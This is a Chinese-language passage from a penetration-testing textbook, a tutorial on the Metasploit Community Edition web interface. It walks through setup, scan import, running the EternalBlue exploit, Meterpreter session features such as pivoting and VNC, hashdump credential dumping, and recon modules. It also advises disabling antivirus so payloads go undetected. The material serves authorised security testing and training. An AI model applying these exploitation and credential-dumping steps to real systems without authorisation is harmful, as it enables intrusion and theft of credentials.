对于那些更喜欢使用图形用户界面（GUI）工具进行渗透测试的人，可以使用 Metasploit Web 界面。Web 界面是 Metasploit CE（免费）、Metasploit Pro（付费）、Metasploit Express（付费）和 Nexpose Ultimate（付费）的一部分。与 Metasploit 的付费版本中提供的更高级功能不同，免费的 CE 是最基本的。

# 安装和设置 Web 界面

Metasploit Web 界面的安装过程非常简单。

您可以在[`www.rapid7.com/products/metasploit/download/community/`](https://www.rapid7.com/products/metasploit/download/community/)下载社区版。

开始安装过程，您需要填写下载 Metasploit CE 所需的信息。之后，您将被重定向到下载页面，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/632ebce9-7665-4d6e-9fc3-3b8c28a4c995.png)

注意：如果您不想填写表格，您可以打开一个直接链接来下载 Metasploit Web 界面，网址为[`www.rapid7.com/products/metasploit/download/community/thank-you`](https://www.rapid7.com/products/metasploit/download/community/thank-you)。

您还可以从 Rapid7 在 GitHub 上的存储库下载，但您将无法获得激活密钥。

# 在 Windows 上安装 Metasploit 社区版

要在 Windows 上成功安装，请按照以下步骤进行：

1.  首先，请确保您已在系统上禁用了反病毒软件（AV）和防火墙。 AV 通常会检测并标记 Metasploit CE 中的某些文件为恶意文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c434a59b-e8ba-41f8-b7d2-613677ca06e9.png)

1.  此外，请确保如果您在 Windows 上运行，请将 Metasploit 安装文件夹放入 AV 和防火墙的例外列表中。这样，您生成的有效载荷将不受 AV 的影响。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c65e1172-5e8d-4c9a-b029-5fbff6623e49.png)

1.  由于 Metasploit CE 也可以通过 Web 界面（通过 SSL）访问，请确保为 SSL 证书生成过程提供正确的服务器名称（主机名）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e9572261-1f93-49b3-a09a-c3acdd489053.png)

1.  安装完成后，您可以检查`C:\metasploit`目录中的所有文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e5224e7e-4842-4199-81d3-e866ab3cf393.png)

1.  在您可以开始使用 Web 界面之前，您需要初始化用户帐户。如果尝试使用主机名而不是 localhost 访问 Web 服务器，将收到警告消息。要继续，请按照给定的说明进行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a087dc88-6b9b-49c5-bdf5-5789f7782939.png)

1.  要初始化用户帐户，您需要在`C:\metasploit`目录中执行`createuser`批处理脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2c0f5d8b-ca7e-4170-b1d6-b68e7eb2b245.png)

1.  现在只剩下最后一步了。创建用户后，您将被重定向到激活页面。要激活 CE 实例，您需要获取产品密钥，该密钥可以从注册时使用的注册电子邮件 ID 中检索（这就是注册重要的原因-这样您就可以通过电子邮件接收激活代码）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/89d86bf9-c595-4ff4-a491-f28a265adff3.png)

1.  使用您的电子邮件中的产品密钥激活 Metasploit CE：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4dc07bbb-3e50-43b0-bf20-4c40890b8bba.png)

成功激活后，您将被重定向到项目列表页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c87643a0-e08c-4497-83d9-c6aada60bb39.png)

在您可以开始使用 Metasploit Web 界面之前，您需要了解界面本身。

**注意：**试用密钥无法重复使用，并将在 14 天后过期。

# 在 Linux/Debian 上安装 Metasploit Community Edition

要在 Linux/Debian 上成功安装，请按照以下步骤进行：

1.  下载 Metasploit CE Linux 安装程序。您需要更改安装程序的权限为`execute`，可以使用`chmod`命令完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/aa64bf19-a086-4d27-8f08-6759e6926d82.png)

1.  运行 Linux 安装程序，并按屏幕上显示的说明进行操作。安装完成后，将显示 Web 界面的 URI：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/97643a84-c567-4dfb-b718-d5e7740e0456.png)

1.  您需要访问 URI 才能访问 Web 界面。默认情况下，URI 将是`https://localhost:3790/`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f6c1a85a-9b1f-450e-a5fb-1d6355372254.png)

1.  一旦初始化过程和设置完成（通常需要几分钟），屏幕上将显示警告消息。按照屏幕上的说明通过诊断 shell 创建用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ffd5831b-1024-4c86-b7dc-e2bc71455681.png)

1.  在执行诊断 shell 后，Metasploit 环境将为您的 shell 设置，并且您可以执行`createuser`脚本。您还可以看到 Web 界面，在那里您将找到一个新用户设置页面。填写用户详细信息以创建帐户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/065b8082-5eba-4634-b9dc-b1053dd24fa6.png)

1.  从您的电子邮件 ID 获取产品密钥并激活 CE 以继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/08b5c5bf-e746-4e2b-84dd-52e94359d91e.png)

注意：不支持 32 位 Linux（包括 Kali）和 macOS。

接下来，让我们开始使用 Metasploit Web 界面。

# 开始使用 Metasploit Web 界面

Metasploit Web 界面具有非常易于使用的界面，可以帮助对 CLI 经验较少的测试人员。在我们开始测试之前，让我们了解界面。

# 界面

Metasploit Web 界面可以分为以下菜单：

+   主菜单

+   项目标签栏

+   导航面包屑

+   任务栏

让我们逐个查看这些菜单。

# 主菜单

主菜单可以在页面顶部看到。在主菜单中，您可以从项目菜单访问项目设置，从帐户菜单访问帐户设置，并从管理菜单管理管理任务。

任何警报都可以从通知中心查看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/32413e21-5f18-42e9-b234-d4c0e7cbbe23.png)

让我们详细看一下它们：

+   **项目菜单**：用于从项目菜单创建、编辑、打开和管理项目。

+   **帐户菜单**：用于管理帐户信息，例如更改密码、设置时区和联系信息。

+   **管理菜单**：用于进行任何管理更改，如更新系统、许可密钥、编辑用户帐户和配置全局设置。

+   **通知中心**：在通知中心，您将找到所有警报，表示任务已完成或软件更新已提供。单击警报将显示下拉菜单，其中包含所有项目的最新警报。

接下来，我们将看一下项目选项卡栏。

# 项目选项卡栏

项目选项卡栏是位于主菜单正下方的选项卡菜单。可以从该选项卡菜单管理正在运行的项目、漏洞分析、已打开的 Meterpreter/shell 会话、网络钓鱼活动、Web 应用程序测试、模块、凭证、报告、导出和任务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ea92a539-22a4-4a1f-8273-474d90aa1595.png)

让我们详细看一下它们：

+   概述：显示高级图形信息，如发现的主机和服务数量以及会话和凭证数量。在运行扫描或导入主机之前，这些信息不会显示。

+   分析：此选项卡允许我们将大型网络/主机分类为组，这样我们就可以更容易地管理和利用它们。

+   会话：会话选项卡显示了我们在目标上的活动会话。

+   活动：此选项卡允许我们在一组目标上创建、管理和运行社会工程活动，包括电子邮件、网页、便携文件等。

+   Web 应用程序：这是专业版功能，允许我们扫描 Web 应用程序并识别漏洞。

+   模块：此选项卡允许我们搜索可用模块、查看它们的信息，并在目标上执行它们。

+   凭证：此选项卡允许我们添加/编辑或删除通过利用收集到的凭证。

+   报告：这也是专业版功能。此选项卡允许我们查看并创建我们的发现报告。

+   导出：此选项卡允许我们将数据（如凭证）导出为多种格式，如 XML 和 ZIP。

+   任务：此选项卡允许我们管理工具当前正在运行的任务的状态。

接下来，我们将看一下**导航面包屑**。

# 导航面包屑

您可以使用**导航面包屑**来确定项目中的当前位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c5e04b77-31d8-4eba-91d9-efad7faac501.png)

这可以帮助我们更高效地工作。

# 任务栏

您可以使用**任务栏**快速执行列出的任务，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/705b40f9-9aef-4f86-8703-c9c20965121e.png)

接下来，我们将看一下项目创建。

# 项目创建

就像 Metasploit 使用*工作空间*来组织已收集的数据一样，CE 使用*项目*来分隔数据集。默认情况下，CE 内部有一个默认项目。如果您不创建自定义项目，您所做的一切都将保存在此项目下。

# 默认项目

每当我们使用 Web 界面时，使用的第一个项目将是“默认”项目。该项目将显示我们扫描的主机数量、维护的会话数量以及在“默认”项目处于活动状态时分配给主机的任务数量。下图显示了名为“默认”的列出项目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bc5b7411-097a-4287-86a8-6580d89b8e0b.png)

接下来，让我们学习如何创建我们自己的自定义项目。

# 创建自定义项目

Metasploit CE 还允许我们创建自己的自定义项目：

1.  这可以通过单击“项目”菜单并选择“新建项目”来完成。这将带我们到下图所示的页面。在这里，我们将指定项目详细信息，如项目名称、描述和网络范围：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fbe883c9-782a-4302-9387-ad22c243c064.png)

1.  单击“创建项目”按钮后，您将进入项目仪表板页面。在这里，您将看到不同的部分，显示迄今为止执行的任务的摘要及其结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/afba9d3f-f40d-4050-8dd4-626e3a7b89f7.png)

1.  返回主页，您应该能够看到两个项目。一个称为`default`，另一个称为`Web Exploitation Project`，这是我们刚刚创建的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4ee56451-c1da-4feb-b94e-f3b43a76ae9e.png)

接下来，让我们开始枚举。

# 目标枚举

现在我们已经创建了我们的项目，让我们从第一步开始-枚举。执行枚举有两种方法：使用 Metasploit 的内置扫描模块，或者导入由 Nmap 或其他 MSF 支持的工具完成的扫描。

# 使用内置选项

Metasploit web 界面为我们提供了一些内置的选项/模块，我们可以使用这些选项/模块对目标系统执行枚举。按照以下步骤使用内置选项执行枚举：

1.  要使用内置选项，请从项目仪表板单击扫描按钮，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b286700f-1c79-475e-bd22-7b66da7ff39a.png)

1.  在下一页中，我们输入要扫描的 IP 地址。我们还为扫描定义了高级选项，例如要排除的端口和自定义范围：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bba34673-bc4f-4aa6-8881-5bac22f1d21d.png)

1.  单击“显示高级选项”按钮可以设置扫描的一些扩展功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/64125184-9795-4d54-88fe-852d7a84427b.png)

1.  一切设置好后，您可以单击“启动扫描”按钮。该工具将以您指定的选项在后台启动 Nmap 扫描，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/29e320ae-6746-45d9-a540-d08272e28f3b.png)

1.  您可以通过单击项目菜单 -> [工作空间] -> 主机来查看主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/32b708bc-ff21-43a5-ba09-57eda3f9fb48.png)

如下截图所示，扫描的主机已添加到主机列表中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fc1ade70-4e86-4759-a334-f6dbe90ae0f2.png)

1.  要查看扫描主机上运行的服务，您可以单击上一步中显示的主机，或者您可以打开项目菜单 -> [工作空间] -> 服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d0483bf2-9809-478d-bd01-d60f09547354.png)

在两种情况下，您都可以看到扫描主机上运行的服务。但是，不建议通过 Web 界面执行扫描，因为它使用的是相当古老的 Nmap 版本 4。

# 导入扫描结果

或者，我们也可以使用第三方工具执行枚举。然后，可以将工具的结果导入到 MSF 中。按照以下步骤导入扫描结果：

1.  在使用 Metasploit 进行利用之前，最好先进行端口扫描和服务枚举。您可以使用 Nmap 单独进行扫描，并使用`-oX`开关以 XML 格式保存扫描结果，而不是使用 Metasploit 的内置端口扫描程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8844d50f-3488-45ce-8726-db827425b59f.png)

1.  就像在`msfconsole`中使用的`db_import`命令一样，您可以通过单击导入按钮在 Metasploit web 界面中使用相同的功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fcc57c8f-a066-4fd0-86ff-c53d6e074be9.png)

1.  单击导入按钮后，您将被重定向到导入数据页面，在那里您将有选项导入您的数据。

1.  您可以从 Nexpose、Sonar（Sonar 项目是 Rapid7 进行的安全研究项目，通过不同的服务和协议在全球范围内进行互联网调查，以获得有关常见漏洞全球暴露情况的见解）和第三方扫描工具（如 Acunetix、Nessus、Nmap 等）支持的文件中导入数据。在这种情况下，我们进行了全端口扫描，并将 Nmap 结果以 XML 格式保存：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9896db7b-2116-411c-94d4-45f279d2036d.png)

1.  作为一个可选功能，您可以启用自动标记，根据其操作系统，它将主机标记为`os_windows`、`os_linux`和`os_unknown`。单击“导入数据”，扫描将被导入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b90f6536-e600-4731-bf5b-5699c2c4763b.png)

1.  您可以返回到项目概述菜单，查看更新后的项目空间：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4ff0579a-a156-41ac-9762-8707359fcd2f.png)

1.  如前面的屏幕截图所示，添加了一个新主机，上面运行了 15 个服务。单击检测到的 15 个服务的超链接，将显示服务页面。

1.  您可以通过单击**项目**菜单 -> [工作空间] -> 服务来查看相同的页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0a0f513e-da8b-4986-883c-e27c8a093c16.png)

在下一节中，您将了解用于进一步枚举和利用目标主机的 Metasploit 模块。

注意：以下是所有支持的第三方扫描报告，可以导入：**Foundstone Network Inventory XML, Microsoft MBSA SecScan XML, nCircle IP360 XMLv3 and ASPL, NetSparker XML, Nessus NBE, Nessus XML v1 and v2, Qualys Asset XML, Qualys Scan XML, Burp Sessions XML, Burp Issues XML, Acunetix XML, AppScan XML, Nmap XML, Retina XML, Amap Log, Critical Watch VM XML, IP Address List, Libpcap Network Capture, Spiceworks Inventory Summary CSV, **和** Core Impact XML.**

# 模块选择

Metasploit CE 中使用的模块与 MSF 中使用的模块相同。根据情况，我们可以使用辅助模块、利用模块或后利用模块。让我们先看看辅助模块。

# 辅助模块

在这种情况下，我们有一个目标主机，IP 为`192.168.2.17`。您可以在以下屏幕截图中看到在此主机上运行的服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/416f774c-30c4-4d0d-b281-b9b4e9f624e9.png)

从网络渗透测试的角度来看，攻击者肯定会研究端口`445/tcp`（SMB）以进行利用，因此让我们使用 SMB 模块：

1.  点击**项目**选项卡中的模块选项卡以显示模块页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fb401e53-2d4c-4899-8dea-654b544a87a7.png)

1.  对于 SMB，您可以使用 SMB 版本检测辅助模块，可以使用搜索栏搜索：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8e5f2a7b-456b-4c95-95f8-b554cb930121.png)

1.  选择模块后，将显示模块选项页面。您可以设置目标地址，以及其他一些选项（如果需要）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d29dad9c-1d3e-4fff-a0d7-ed57903dbfab.png)

1.  点击“运行模块”（如前面的屏幕截图所示）将执行该模块，并显示模块的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3ec6cd12-2c56-4206-b2d6-987d86efd88b.png)

1.  您可以通过转到**项目**选项卡 -> 分析 -> 注释来确认模块找到的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/788c3d2f-b59d-48f2-90e6-5071892b8d04.png)

枚举目标后，您可以使用利用模块。

# 使用利用模块

要使用利用模块，请按照以下步骤进行：

1.  点击**项目**选项卡上的模块选项卡，搜索`EternalBlue` exploit。这是一个非常可靠的利用，可以在这种情况下使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9c581e9c-6032-4de1-82f0-ce0f1de17d8d.png)

1.  在这里，您可以设置目标地址和有效载荷选项。执行利用后，有效载荷（比如说，Meterpreter）将被注入内存，并且将打开一个 Meterpreter shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fe3acb1b-ad29-40f5-96c3-3bc827b42429.png)

1.  点击“运行模块”将启动利用模块。结果将显示在屏幕上，并为任务分配一个任务 ID：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/59355723-3128-43bf-bde6-9f7e22dcd626.png)

成功利用后，您将收到有关新打开会话的通知。

# 会话交互

成功利用后，会打开一个会话，并且您将在**项目**选项卡上收到通知：

1.  要查看已打开的会话，您需要点击**项目**选项卡中的**会话**选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8f3423bd-6575-4e9a-8169-e32abf70723f.png)

1.  与任何打开的会话进行交互，只需点击“会话[ID]”，如前面的屏幕截图所示。MSF Web 界面支持的会话交互功能可以在以下屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4b9d87e3-01da-4b7e-80bd-f8601adca775.png)

以下是您可以用于会话交互的选项：

+   **收集系统数据**：此选项将允许您收集系统证据和敏感数据，如密码、系统信息、屏幕截图等。此功能仅在 Metasploit Pro 版本中可用。

+   **虚拟桌面**：此选项将注入**虚拟网络计算**（**VNC**）DLL，并在给定端口上启动 VNC 服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d66b8562-2ee0-40b4-8126-9f1775719fe8.png)

您可以通过此端口与目标系统上运行的桌面进行交互：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1f3a09f9-51d8-462f-bb63-6849a0e8c21e.png)

注意：用户将收到 VNC 连接的通知。

+   **访问文件系统**：使用此选项，您可以浏览文件系统。您甚至可以上传、下载和删除文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/be7c6ada-12c5-4dee-8469-066f5d375311.png)

+   **搜索文件系统**：如果您想要搜索特定文件或执行通配符搜索，可以使用此选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/27986ef9-9936-425f-aa58-9ef681ad4978.png)

+   **命令行 Shell**：如果您想要访问 Meterpreter 命令行 Shell，可以单击此按钮打开命令行 Shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/120f6bd2-d353-477a-bbf5-1b7ea2d739ea.png)

您可以在给定的输入框中执行命令。结果将显示如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/183652fe-4998-4768-9951-a5e4deea65b6.png)

此窗口仅支持 Meterpreter 命令。可以使用`shell`命令运行系统命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a858add3-1918-4146-87bc-00640fa8bfb4.png)

+   **创建代理枢纽**：创建代理枢纽与添加枢纽路由相同：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b7d20321-c0e8-4e77-9665-f15721ba7421.png)

您可以使用此选项，如果您想要连接到内部网络进行进一步的利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bd6036ff-5ca7-412f-b39f-95dc2fe51d96.png)

+   **创建 VPN 枢纽**：此选项将允许您在受损的计算机中创建一个加密的二层隧道，然后通过目标机器路由任何网络流量。这将授予您完整的网络访问权限，就像您在本地网络上一样，没有周边防火墙来阻止您的流量。

+   **更改传输**：要更改会话的传输机制，可以使用此选项，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/98b7985d-d9ab-4369-a7be-7fef82c16736.png)

首先，您需要为特定传输启动处理程序；否则，该过程将失败。

+   **终止会话**：一旦使用此选项，会话将被终止。要与会话交互，您将需要重新开始利用过程。

接下来，让我们看看 Web 界面中可用的后渗透模块。

# 后渗透模块

对于后渗透，您可以使用界面中可用的后渗透模块，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/da9411fe-a8f0-4f8e-8a75-aedf2aff5cc5.png)

1.  对于前面截图中显示的目标，让我们使用`hashdump`后渗透模块。要使用此模块，只需检查模块需要执行的会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/98d1a906-33a2-4155-9aef-4006d6d807cf.png)

1.  单击“运行模块”以执行`hashdump`模块。此模块将从 SAM 数据库中转储 NTLM 哈希。此模块将被分配一个新的任务 ID。您可以在任务栏中检查任务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/45e0e625-5b38-422e-bcbc-a6b3cb3dd286.png)

1.  提取的哈希可以在**项目**选项卡栏的凭据菜单中查看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7ea33316-97f7-48c3-8ae8-4d7fb1d5e59d.png)

您可以使用不同的后渗透模块，具体取决于情况。

# 总结

在本章中，我们讨论了 MSF 的 Web 界面。我们首先安装了 Metasploit 并设置了其配置。然后，我们继续讨论模块，如创建项目和从不同工具导入扫描结果。之后，我们查看了辅助和利用，然后学习了 Metasploit Web 界面中可用的后渗透模块。

在下一章中，我们将学习如何使用 Metasploit 对不同类型的目标、协议和端口进行侦察。

# 问题

1.  Metasploit web 界面具有哪些功能？

1.  在我的组织中，我必须在使用的任何 Web 服务器上使用公司的 SSL 证书。我可以为 Metasploit web 界面提供自定义 SSL 证书吗？

1.  哪些 Web 浏览器与 Metasploit web 界面兼容？

1.  Metasploit 支持 RESTful API 吗？

1.  Metasploit web 界面支持自定义报告吗？

# 进一步阅读

有关 Web 界面的更多信息，请访问官方文档页面[`metasploit.help.rapid7.com/docs/metasploit-web-interface-overview`](https://metasploit.help.rapid7.com/docs/metasploit-web-interface-overview)。


# 第五章：使用 Metasploit 的渗透测试生命周期

本节包括四章，重点关注使用 Metasploit 进行 Web 应用程序的侦察、枚举、评估和利用。我们还将详细介绍 WMAP 和 Nessus 插件。

本节包括以下章节：

+   第四章，使用 Metasploit 进行侦察

+   第五章，使用 Metasploit 进行 Web 应用程序枚举

+   第六章，使用 WMAP 进行漏洞扫描

+   第七章，使用 Metasploit（Nessus）进行漏洞评估


# 第六章：使用 Metasploit 进行侦察

信息收集或**侦察**（**recon**）是渗透测试周期中最关键和耗时的阶段。在渗透测试 Web 应用程序时，您需要收集尽可能多的信息。信息越多越好。信息可以是任何类型 - 网页服务器横幅、IP 地址、运行 Web 应用程序服务的已打开端口列表、任何支持的 HTTP 标头等。这种信息将帮助渗透测试人员对 Web 应用程序进行测试检查。

在本章中，我们将介绍使用 Metasploit 进行侦察。我们将看一下可以用来执行侦察的模块。

我们将涵盖以下主题：

+   侦察介绍

+   主动侦察

+   被动侦察

# 技术要求

以下是本章的先决条件：

+   安装了 Web 界面的 Metasploit **社区版** (**CE**)

+   *nix 系统或 Microsoft Windows 系统中的任何一个

+   访问 Shodan 和 Censys 账户以获取 API 密钥

# 关于侦察的介绍

简而言之，*recon*是渗透测试人员将收集与他们正在测试的 Web 应用程序相关的尽可能多的信息的阶段。侦察可以分为两种类型：

+   **主动侦察**：收集目标和来自目标的信息

+   **被动侦察**：通过第三方来源收集目标的信息

让我们在接下来的章节中详细看一下它们。

# 主动侦察

主动侦察（或*主动攻击*）是一种侦察类型，测试人员在此期间与目标服务器/系统进行通信，可以是从他们自己的系统或通过预先拥有的**虚拟专用服务器**（**VPS**）进行通信。在本章中，我们将看一些我们可以使用 Metasploit 内置脚本来执行主动和被动侦察的方式。

# 横幅抓取

横幅抓取是一种用于获取有关网络设备的信息的技术，例如操作系统、开放端口上运行的服务、使用的应用程序或版本号。它是信息收集阶段的一部分。Metasploit 有许多模块可以用来从不同类型的服务中收集横幅。

在下面的例子中，我们将使用`http_version`模块，它可以检测给定 IP 上运行的 HTTP 协议的服务的版本号和名称：

1.  从项目选项卡栏中转到模块，并在搜索模块框中输入`http_version`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b862b6f9-26a6-40dc-a8b9-917acc811cf9.png)

1.  现在，点击模块名称。这将把我们重定向到模块选项，我们可以在那里指定目标地址和其他设置，如下面的屏幕截图所示。

在我们的例子中，我们将选择端口`80`，因为我们知道 HTTP 协议正在端口`80`上运行。这个值可以更改为任何 HTTP 运行的端口号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2717ee38-cd2c-44fd-bc2b-5a1b10d3e3ce.png)

1.  一切准备就绪后，点击前面屏幕截图中显示的运行模块按钮。将创建一个新任务。点击项目选项卡中的任务，以查看任务的状态：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/01b968e7-a861-477d-8094-af3671c50cb3.png)

1.  当模块完成执行时，我们可以返回到分析选项卡，点击我们运行模块的主机 IP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/525c4a3b-f38f-470c-8a15-da71e2138198.png)

1.  我们将看到模块已经检测到并打印出了在端口`80`下运行的横幅，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9300915a-ab95-4160-9ecc-9405cdc9a303.png)

接下来，让我们看看如何检测 Web 应用程序的 HTTP 标头。

# HTTP 标头检测

现在让我们尝试检测 Web 应用程序的 HTTP 标头。HTTP 标头可以透露关于应用程序的许多信息，比如正在使用的技术、内容长度、cookie 到期日期、XSS 保护等：

1.  转到模块部分，搜索`http_header`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/610f2a40-6bbc-496e-ad15-d39f0b27080a.png)

1.  点击模块名称将带我们到选项页面，我们可以在那里指定目标地址、端口号、线程等：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c2f2f72b-33d2-4eec-b016-46f52d734098.png)

1.  在配置设置后，点击“运行模块”，将启动一个新任务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/656b4204-c179-4fe1-b74f-1b6c2a0dd760.png)

1.  任务完成后，我们可以转到分析选项卡，在“注释”部分，我们将能够看到扫描模块发现的所有标头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/24741b57-1301-4893-b102-24c1db1ee70c.png)

接下来，让我们看看网页机器人页面枚举。

# 网页机器人页面枚举

`robots.txt`（或*robots 排除标准*）是网站用来与爬虫或机器人通信的方法。让我们看看以下步骤中是如何进行枚举的：

1.  要阻止`Googlebot`访问子文件夹，我们将使用以下语法：

```
User-agent: Googlebot 
Disallow: /example-subfolder/
```

1.  要告诉所有机器人不要爬取网站，我们可以将以下数据放入文本文件中：

```
User-agent: *
Disallow: /
```

在这一部分，我们将使用`robots_txt`辅助程序来获取网站的`robots.txt`文件的内容：

1.  首先搜索带有`robots_txt`关键字的模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/03b03718-1eb5-4bea-816a-46eb9ab8b151.png)

1.  点击模块将重定向我们到选项页面，在那里我们可以设置目标地址、RPORT、路径、VHOST 等。在我们的案例中，我们使用了`www.packtpub.com`作为 VHOST 的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a037bd79-c623-4acd-8030-e6f065744219.png)

1.  点击“运行模块”后，将创建一个新任务，我们将能够在任务窗口中看到脚本运行的状态：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/60970054-15a3-4030-8616-270e0012dc92.png)

